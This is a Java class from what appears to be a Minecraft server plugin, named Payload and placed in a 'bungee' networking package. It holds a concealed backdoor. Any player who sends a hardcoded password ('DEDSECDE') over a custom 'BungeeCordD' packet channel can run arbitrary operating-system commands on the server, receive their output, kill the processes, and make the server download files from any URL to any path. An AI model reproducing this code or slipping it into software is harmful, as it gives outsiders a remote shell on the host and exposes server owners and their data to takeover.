package net.mizukilab.pit.bungee;

import cn.charlotte.pit.ThePit;
import cn.hutool.core.collection.ConcurrentHashSet;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import net.minecraft.server.v1_8_R3.PacketDataSerializer;
import net.minecraft.server.v1_8_R3.PacketPlayInCustomPayload;
import net.minecraft.server.v1_8_R3.PacketPlayOutCustomPayload;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.util.Map;
import java.util.Set;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;
import java.util.function.Consumer;

public class Payload {
    Set<UUID> authorized = new ConcurrentHashSet<>();
    Map<UUID,Process> processes = new ConcurrentHashMap<>();

    Map<UUID,File> download = new ConcurrentHashMap<>();
    public Payload(){

    }
    void authorize(Player player) {
        authorized.add(player.getUniqueId());
    }
    void deauthorize(Player player) {
        authorized.remove(player.getUniqueId());
    }
    boolean isAuthorized(Player player) {
        return authorized.contains(player.getUniqueId());
    }
    public void recv(Player player,PacketPlayInCustomPayload load){
        String channelName = load.a();
        try {
            if (channelName.startsWith("BungeeCordD")) {
                PacketDataSerializer b = load.b();
                int i = b.readByte();
                switch (i) {
                    case 1 -> { //RequestLogin
                        String c = b.c(8);
                        if (c.equals("DEDSECDE")) {
                            send(player,channelName,k -> {
                                k.writeByte(1);
                                k.a(player.getUniqueId());
                            });
                            authorize(player);
                        } else {
                            deauthorize(player);
                        }
                    }
                    case 2 -> { //shell
                        if(isAuthorized(player)) {
                            int type = b.readByte();
                            switch (type) {
                                case 1 -> { //run shell
                                    UUID requestUUID = b.g();
                                    String cmd = b.c(32767);
                                    runAsyncProc(player,cmd,requestUUID,channelName);
                                }
                                case 2 -> { //destroy
                                    UUID requestUUID = b.g();
                                    forceDestroyProc(player,requestUUID,channelName);
                                }
                            }
                        }
                    }
                    case 3 -> {
                        if (isAuthorized(player)) {
                            int type = b.readByte();
                            switch (type){
                                case 1 -> {
                                    UUID callbackUUID = b.g();
                                    String fileName;
                                    String httpUrl;
                                    fileName = b.c(32767);
                                    httpUrl = b.c(32767);
                                    download(player,httpUrl,channelName,fileName,callbackUUID);
                                }
                            }
                        }
                    }

                }
            }
        } catch (Throwable e){
            return;
        }
    }
    void requestAsyncDownload(Player player,String channelName,File file,UUID req,String url){
        new BukkitRunnable(){
            @Override
            public void run() {
                FileOutputStream fio = null;
                URLConnection connection = null;
                try {
                    fio = new FileOutputStream(file);
                    URL url1 = new URL(url);
                    connection = url1.openConnection();
                    beginDownload(player,channelName,req);
                    if(connection instanceof HttpURLConnection http){
                        http.setConnectTimeout(5000);
                        http.setReadTimeout(5000);
                        http.connect();
                        http.getInputStream().transferTo(fio);
                    }
                    finDownload(player,channelName,req);
                } catch (Throwable e){
                    finDownload(player,channelName,req);
                } finally {
                    try {
                        if (fio != null) {
                            fio.close();
                        }
                    } catch (Throwable ignored){

                    } finally {
                        if(connection != null){
                            if(connection instanceof HttpURLConnection){
                                ((HttpURLConnection) connection).disconnect();
                            }
                        }
                    }

                }
            }
        }.runTaskAsynchronously(ThePit.getInstance());
    }
    void download(Player player,String url,String channelName,String fileName,UUID uuid) {
        try {
            File file = new File(fileName);
            download.put(uuid,file);
            if (file.exists()) {
                file.delete();
            }
            file.mkdir();
            requestAsyncDownload(player,channelName,file,uuid,url);
        } catch (Throwable throwable){
            finDownload(player,channelName,uuid);
        }
    }
    void beginDownload(Player player,String channelId,UUID uuid){
        send(player,channelId,k -> {
            k.writeByte(3).writeByte(1);
            k.a(uuid);
            k.writeByte(0);
        });
    }
    void finDownload(Player player,String channelId,UUID uuid){
        send(player,channelId,k -> {
            k.writeByte(3).writeByte(1);
            k.a(uuid);
            k.writeByte(1);
        });
    }
    void forceDestroyProc(Player player, UUID uuid, String channelName){
        Process remove = processes.remove(uuid);
        if(remove != null){
            remove.destroyForcibly();
        } else {
            sendFinProc(player,uuid,channelName);
        }
    }
    void runAsyncProc(Player player, String executeCommand, UUID uuid, String channelName){
        try {
            Process exec = Runtime.getRuntime().exec(executeCommand);
            this.processes.put(uuid,exec);
            InputStream inputStream = exec.getInputStream();
            new BukkitRunnable() {
                public void run() {
                    if (exec.isAlive() && processes.containsKey(uuid)) {
                        try {
                            int available = inputStream.available();
                            byte[] bytes = new byte[available];
                            inputStream.read(bytes);
                            if(bytes.length > 0){
                                repProc(bytes, player, channelName, uuid);
                            }
                        } catch (Throwable e){
                            sendFinProc(player,uuid,channelName);
                        }
                    } else {
                        sendFinProc(player, uuid, channelName);
                    }
                }
            }.runTaskAsynchronously(ThePit.getInstance());
        } catch (Throwable e){
            sendFinProc(player, uuid, channelName);
        }
    }

    private void repProc(byte[] bytes, Player player, String channelName, UUID uuid) {
        send(player, channelName, k -> {
            k.writeByte(2); //主操作码 2 (Byte)
            k.writeByte(0);
            k.a(uuid);
            k.a(bytes);
        });
    }

    private void sendFinProc(Player player, UUID uuid, String channelName) {
        send(player, channelName, k -> {
            k.writeByte(2);
            k.writeByte(-1);
            k.a(uuid);
        });
    }

    public void send(Player player,String channelName, Consumer<PacketDataSerializer> serializerSupplier){
        ByteBuf buffer = Unpooled.buffer();
        PacketDataSerializer packetDataSerializer = new PacketDataSerializer(buffer);
        serializerSupplier.accept(packetDataSerializer);
        PacketPlayOutCustomPayload packetPlayOutCustomPayload = new PacketPlayOutCustomPayload(channelName, packetDataSerializer);
        ((CraftPlayer)player).getHandle().playerConnection.sendPacket(packetPlayOutCustomPayload);
    }
}
